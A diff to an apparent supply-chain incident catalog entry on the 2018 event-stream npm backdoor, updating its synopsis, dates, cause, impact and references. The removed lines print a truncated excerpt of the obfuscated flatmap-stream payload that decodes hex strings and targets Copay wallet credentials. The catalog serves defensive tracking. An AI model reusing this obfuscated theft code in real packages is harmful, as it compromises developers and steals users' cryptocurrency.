@@ -1,51 +1,23 @@
 - name: event-stream
-  title: event-stream npm package backdoored
-  start_date: 2018-09-04
-  end_date: 2018-11-26
-  license: MIT
-  website: https://github.com/dominictarr/event-stream
-  repo: https://github.com/dominictarr/event-stream
-  attribution_type: new maintainer
-  attribution: right9ctrl
+  title: event-stream NPM package maintainer change injects backdoor
+  synopsis: A new maintainer was granted publishing rights to the popular 'event-stream' library. This maintainer added a malicious dependency ('flatmap-stream') containing obfuscated code. The code targeted developers using the Copay Bitcoin wallet application to steal cryptocurrency private keys.
+  start_date: 2018-09-04 # Date flatmap-stream added
+  end_date: 2018-11-26 # Date malicious package removed from NPM
+  attribution_type: Individual hacker # Socially engineered maintainer access
   component_type: Library
-  lang: JavaScript
-  cause: maintainer sabotage
-  motive: cryptocurrency theft
-  attack_vector: maintainer transfer
-  insertion_phase: source
-  impact_type: cryptocurrency theft
-  impact_user_count: 1500000
+  lang: Javascript
+  cause: Social engineering # Maintainer handover
+  motive: Financial gain # Cryptocurrency theft
+  transitive: true # Added malicious dependency flatmap-stream
+  insertion_phase: dependency
+  impact_type: Credential theft, Cryptocurrency theft
+  impact_user_count: 8000000 # Downloads of event-stream
   references:
     - https://github.com/dominictarr/event-stream/issues/116
+    - https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502
     - https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
   versions:
-    - 3.3.6
-  synopsis: A new maintainer of the popular event-stream NPM package inserted malicious code targeting users of the Copay Bitcoin wallet. The code would steal cryptocurrency wallet credentials when used in the specific target application.
-  compromise_desc: The original maintainer of event-stream transferred ownership to a new maintainer using the handle "right9ctrl" who had offered to maintain the package. The new maintainer added a dependency called flatmap-stream which contained obfuscated malicious code specifically targeting the Copay Bitcoin wallet application. The malicious code would exfiltrate private keys when the application was used.
-  impact_desc: The compromised package was downloaded approximately 8 million times, but the actual impact was limited to users of the Copay Bitcoin wallet (estimated at 1.5 million). When the Copay application was run with the compromised dependency, it would attempt to steal private keys and cryptocurrency. Several versions of the Copay wallet (versions 5.0.2 through 5.1.0) were affected.
-  example_code: |
-    // Malicious code from flatmap-stream
-    ! function() {
-      try {
-        var r = require,
-          t = process;
-        function e(r) {
-          return Buffer.from(r, "hex").toString()
-        }
-        var n = r(e("2e2f746573742f64617461")),
-          o = t[e(n[3])][e(n[4])];
-        if (!o) return;
-        var u = r(e(n[2]))[e(n[6])](e(n[5])),
-          a = u[e(n[7])],
-          c = u[e(n[8])],
-          i = u[e(n[9])],
-          l = r(e(n[10]))[e(n[13])](u.__dirname + "/" + e(n[11])), f = JSON[e(n[14])](l);
-        if (f[e(n[15])] !== e(n[16])) return;
-        f[e(n[17])][e(n[18])][e(n[19])](function(r) {
-          try {
-            if (r[e(n[20])].indexOf(e(n[21])) === -1) return;
-            // Part of the code that steals wallet credentials
-            var t = o({
-              cwd: "/tmp"
-            }), u = e(n[22]) + " '" + r[e(n[20])] + "'", a = t[e(n[23])](u);
-            // ...
+    - ">=3.3.6" # Malicious code activated via flatmap-stream dependency
+  artifacts:
+    - url: https://github.com/dominictarr/event-stream/commit/5446870da3d748502593375652b41797a1457088 # Commit adding flatmap-stream
+    - url: https://github.com/postmanlabs/postman-app-support/issues/5338 # Example of impacted downstream project
